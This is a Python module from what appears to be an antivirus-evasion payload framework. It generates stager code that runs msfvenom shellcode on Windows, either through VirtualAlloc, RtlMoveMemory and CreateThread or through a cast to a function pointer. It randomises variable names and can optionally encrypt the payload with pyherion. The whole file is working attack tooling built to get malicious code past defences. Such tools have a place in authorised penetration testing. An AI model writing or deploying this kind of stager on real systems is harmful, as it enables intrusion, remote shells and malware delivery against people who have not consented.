"""

Inline shellcode injection.

Uses VirtualAlloc() to allocate space for shellcode, RtlMoveMemory() to 
copy the shellcode in, then calls CreateThread() to invoke.

Inspiration from http://www.debasish.in/2012/04/execute-shellcode-using-python.html

 - or - 

Very basic void pointer reference, similar to the c payload

module by @christruncer

"""

from modules.common import shellcode
from modules.common import messages
from modules.common import randomizer
from modules.common import crypters

class Stager:
    
    def __init__(self):
        # required options
        self.shortname = "FlatInjection"
        self.description = "No obfuscation, basic injection of shellcode through virtualalloc or void pointer reference."
        self.language = "python"
        self.rating = "Normal"
        self.extension = "py"
        self.shellcode = shellcode.Shellcode()
        
        # options we require user interaction for- format is {Option : [Value, Description]]}
        self.required_options = {"compile_to_exe" : ["Y", "Compile to an executable"],
                        "use_pyherion" : ["N", "Use the pyherion encrypter"],
                        "inject_method" : ["virtual", "[virtual]alloc or [void]pointer"]}
        
    def generate(self):
        if self.required_options["inject_method"][0].lower() == "virtual":
            # Generate Shellcode Using msfvenom
            Shellcode = self.shellcode.generate()
        
            # Generate Random Variable Names
            ShellcodeVariableName = randomizer.randomString()
            RandPtr = randomizer.randomString()
            RandBuf = randomizer.randomString()
            RandHt = randomizer.randomString()
        
            # Create Payload code
            PayloadCode = 'import ctypes\n'
            PayloadCode += ShellcodeVariableName +' = bytearray(\'' + Shellcode + '\')\n'
            PayloadCode += RandPtr + ' = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),ctypes.c_int(len('+ ShellcodeVariableName +')),ctypes.c_int(0x3000),ctypes.c_int(0x40))\n'
            PayloadCode += RandBuf + ' = (ctypes.c_char * len(' + ShellcodeVariableName + ')).from_buffer(' + ShellcodeVariableName + ')\n'
            PayloadCode += 'ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(' + RandPtr + '),' + RandBuf + ',ctypes.c_int(len(' + ShellcodeVariableName + ')))\n'
            PayloadCode += RandHt + ' = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),ctypes.c_int(0),ctypes.c_int(' + RandPtr + '),ctypes.c_int(0),ctypes.c_int(0),ctypes.pointer(ctypes.c_int(0)))\n'
            PayloadCode += 'ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(' + RandHt + '),ctypes.c_int(-1))\n'

            if self.required_options["use_pyherion"][0].lower() == "y":
                PayloadCode = crypters.pyherion(PayloadCode)

            return PayloadCode

        else:
            # Generate Shellcode Using msfvenom
            Shellcode = self.shellcode.generate()

            # Generate Random Variable Names
            RandShellcode = randomizer.randomString()
            RandReverseShell = randomizer.randomString()
            RandMemoryShell = randomizer.randomString()
        
            PayloadCode = 'from ctypes import *\n'
            PayloadCode += RandReverseShell + ' = \"' + Shellcode + '\"\n'
            PayloadCode += RandMemoryShell + ' = create_string_buffer(' + RandReverseShell + ', len(' + RandReverseShell + '))\n'
            PayloadCode += RandShellcode + ' = cast(' + RandMemoryShell + ', CFUNCTYPE(c_void_p))\n'
            PayloadCode += RandShellcode + '()'
    
            if self.required_options["use_pyherion"][0].lower() == "y":
                PayloadCode = crypters.pyherion(PayloadCode)

            return PayloadCode
